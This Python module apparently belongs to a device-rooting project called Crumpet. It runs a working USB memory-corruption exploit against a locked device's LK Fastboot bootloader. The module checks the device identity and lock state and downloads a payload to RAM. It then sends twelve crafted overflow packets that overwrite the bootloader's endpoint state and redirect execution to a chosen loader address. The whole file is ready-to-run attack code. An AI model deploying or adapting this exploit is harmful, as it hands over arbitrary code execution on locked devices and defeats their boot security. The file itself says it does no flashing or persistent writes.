"""Self-contained LK Fastboot download and direct-loader handoff for Crumpet.

Only the pinned, publicly observed LK protocol constants are used here. No
Amazon binary, binary stage payload, rescue ramdisk or crumpet.py import is
required. A selected handoff calls LK at its direct loader or enters the
project-owned Thumb stage assembled by lk_stage_minimal.py after a RAM
fastboot download. It performs no flash/unlock or persistent device operation.
"""
from __future__ import annotations

import hashlib
import struct
import time

import usb.core
import usb.util

VID, PID = 0x0BB4, 0x0C01
INTERFACE, EP_OUT, EP_IN, PACKET_SIZE = 0, 0x01, 0x81, 512
COMMAND_BUFFER = 0x41E44700
BULK_OUT_EP = 0x41E45EC8
FAKE_STATE = COMMAND_BUFFER + 0x100
FAKE_REQUEST = COMMAND_BUFFER + 0x140
FAKE_COUNT = 0x41
EXPECTED_LK_BUILD = "6f7225e-20230407_002912"
LOADER_ENTRY_THUMB = 0x41E1D585


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def write_exact(device, payload, label, timeout_ms=5000):
    accepted = int(device.write(EP_OUT, payload, timeout=timeout_ms))
    if accepted != len(payload):
        raise RuntimeError(f"Short {label}: {accepted}/{len(payload)}")
    return {"label": label, "length": len(payload), "accepted": accepted}


def response(device, timeout_ms=2500):
    frames = []
    deadline = time.monotonic() + timeout_ms / 1000
    while time.monotonic() < deadline:
        remaining = max(1, int((deadline - time.monotonic()) * 1000))
        frame = bytes(device.read(EP_IN, 64, timeout=remaining))
        frames.append(frame)
        if frame.startswith((b"OKAY", b"FAIL", b"DATA", b"INFO")):
            return {"ascii": b"".join(frames).decode("ascii", "backslashreplace"),
                    "hex": b"".join(frames).hex()}
    raise RuntimeError("Fastboot response timeout")


def read_only_exchange(device, command):
    write_exact(device, command, f"getvar {command!r}", timeout_ms=1500)
    result = response(device)
    if not result["ascii"].startswith("OKAY"):
        raise RuntimeError(f"Fastboot rejected {command!r}: {result['ascii']!r}")
    return result["ascii"]


def open_fastboot():
    device = usb.core.find(idVendor=VID, idProduct=PID)
    if device is None:
        raise RuntimeError(f"Fastboot device {VID:04x}:{PID:04x} not found")
    interface = device.get_active_configuration()[(INTERFACE, 0)]
    identity = (int(interface.bInterfaceClass), int(interface.bInterfaceSubClass), int(interface.bInterfaceProtocol))
    if identity != (255, 66, 3):
        raise RuntimeError(f"Unexpected Fastboot interface identity {identity!r}")
    endpoints = {int(endpoint.bEndpointAddress): endpoint for endpoint in interface}
    for address in (EP_OUT, EP_IN):
        endpoint = endpoints.get(address)
        if endpoint is None or usb.util.endpoint_type(endpoint.bmAttributes) != usb.util.ENDPOINT_TYPE_BULK:
            raise RuntimeError(f"Required bulk endpoint 0x{address:02x} absent")
        if int(endpoint.wMaxPacketSize) != PACKET_SIZE:
            raise RuntimeError(f"Endpoint 0x{address:02x} has unexpected packet size")
    usb.util.claim_interface(device, INTERFACE)
    return device


def close_fastboot(device):
    try:
        usb.util.release_interface(device, INTERFACE)
    except usb.core.USBError:
        pass
    usb.util.dispose_resources(device)


def gates(device, bundle_size):
    result = {
        "product": read_only_exchange(device, b"getvar:product"),
        "unlock_status": read_only_exchange(device, b"getvar:unlock_status"),
        "lk_build_desc": read_only_exchange(device, b"getvar:lk_build_desc"),
        "max_download_size": read_only_exchange(device, b"getvar:max-download-size"),
    }
    if result["product"] != "OKAYCRUMPET":
        raise RuntimeError(f"Product gate failed: {result['product']!r}")
    if result["unlock_status"] != "OKAYfalse":
        raise RuntimeError(f"Locked-device gate failed: {result['unlock_status']!r}")
    if result["lk_build_desc"] != "OKAY" + EXPECTED_LK_BUILD:
        raise RuntimeError(f"Unexpected LK build: {result['lk_build_desc']!r}")
    maximum = int(result["max_download_size"][4:], 0)
    if maximum < bundle_size:
        raise RuntimeError(f"Bundle {bundle_size:#x} exceeds maximum {maximum:#x}")
    result["max_download_size_bytes"] = maximum
    return result


def download(device, payload):
    write_exact(device, f"download:{len(payload):08x}".encode("ascii"), "download_command")
    ready = response(device, 2500)
    expected = f"DATA{len(payload):08x}"
    if ready["ascii"] != expected:
        raise RuntimeError(f"Unexpected download response {ready['ascii']!r}; expected {expected!r}")
    chunks = []
    for offset in range(0, len(payload), 0x10000):
        chunks.append(write_exact(device, payload[offset:offset + 0x10000], f"data_{offset:#x}"))
        time.sleep(0.005)
    terminal = response(device, 5000)
    if terminal["ascii"] != "OKAY":
        raise RuntimeError(f"Download did not finish OKAY: {terminal['ascii']!r}")
    return {"payload_size": len(payload), "payload_sha256": sha256(payload),
            "terminal": terminal, "chunks": chunks}


def loader_packets(entry_thumb=LOADER_ENTRY_THUMB):
    """Build the twelve LK receive-overflow packets with a direct loader entry."""
    if not entry_thumb & 1:
        raise ValueError("LK loader target must be a Thumb address")
    packets = [bytearray(PACKET_SIZE) for _ in range(12)]
    set_u32 = lambda packet, offset, value: struct.pack_into("<I", packet, offset, value)
    set_u32(packets[0], FAKE_STATE - COMMAND_BUFFER + 0x14, FAKE_COUNT)
    set_u32(packets[0], FAKE_REQUEST - COMMAND_BUFFER + 4, FAKE_COUNT)
    set_u32(packets[0], FAKE_REQUEST - COMMAND_BUFFER + 8, entry_thumb)
    out_offset = BULK_OUT_EP - (COMMAND_BUFFER + 11 * PACKET_SIZE)
    if out_offset != 0x1C8:
        raise ValueError("Unexpected bulk endpoint offset for this LK")
    set_u32(packets[-1], out_offset, FAKE_STATE)
    set_u32(packets[-1], out_offset + 8, FAKE_REQUEST)
    set_u32(packets[-1], out_offset + 0x14, 0)
    return [bytes(packet) for packet in packets]


def exploit_transfers(entry_thumb=LOADER_ENTRY_THUMB):
    packets = loader_packets(entry_thumb)
    # The first eight packets must be separate 512-byte URBs. Packets 9-12
    # share one 2048-byte URB so there is no host scheduling gap while the
    # adjacent LK endpoint state is replaced. Coalescing packets 1-8 changes
    # the USB transfer semantics and does not trigger the proven callback.
    return packets[:8] + [b"".join(packets[8:])]


def execute_bundle(payload, entry_thumb=LOADER_ENTRY_THUMB):
    device = open_fastboot()
    result = {"success": False, "phase": "gates", "entry_thumb": hex(entry_thumb),
              "persistent_operations": []}
    try:
        result["baseline_fastboot"] = gates(device, len(payload))
        result["phase"] = "download"
        result["download"] = download(device, payload)
        result["phase"] = "exploit_transfers"
        transfers = exploit_transfers(entry_thumb)
        for index, packet in enumerate(transfers, 1):
            write_exact(device, packet, f"exploit_transfer_{index}", timeout_ms=2000)
            result["last_exploit_transfer"] = index
        result["exploit_transfer_lengths"] = [len(item) for item in transfers]
        result["phase"] = "telemetry"
        # Keep the interface claimed while LK returns from its IRQ handler and
        # runs the ordinary DPC/bulk callback. Bounded reads match the proven
        # handoff window and also accept optional markers from an LK-stage.
        telemetry = []
        timeouts = []
        started = time.monotonic()
        deadline = started + 15.0
        while time.monotonic() < deadline:
            remaining_ms = max(1, int((deadline - time.monotonic()) * 1000))
            try:
                frame = bytes(device.read(EP_IN, PACKET_SIZE, timeout=min(2500, remaining_ms)))
            except usb.core.USBTimeoutError as exc:
                timeouts.append(str(exc))
                if len(timeouts) >= 6:
                    break
                continue
            except usb.core.USBError as exc:
                telemetry.append({"usb_end": f"{type(exc).__name__}: {exc}"})
                break
            timeouts.clear()
            telemetry.append({"ascii": frame.decode("ascii", "backslashreplace"), "hex": frame.hex()})
        result.update(success=True, phase="complete", telemetry=telemetry,
                      telemetry_timeouts=len(timeouts),
                      handoff_window_ms=round((time.monotonic() - started) * 1000))
    except Exception as exc:
        result.update(error=type(exc).__name__, detail=str(exc))
    finally:
        close_fastboot(device)
    return result
